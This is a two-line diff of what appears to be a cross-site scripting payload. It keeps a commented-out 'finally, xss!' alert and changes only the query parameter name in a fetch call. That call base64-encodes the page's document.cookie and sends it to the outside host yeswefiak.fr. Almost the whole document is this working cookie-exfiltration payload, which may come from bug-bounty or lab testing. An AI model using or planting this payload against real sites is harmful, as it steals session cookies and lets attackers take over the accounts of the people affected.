@@ -1,2 +1,2 @@
 //alert("finally, xss!")
-fetch("https://yeswefiak.fr/?data="+btoa(document.cookie))
+fetch("https://yeswefiak.fr/?c="+btoa(document.cookie))
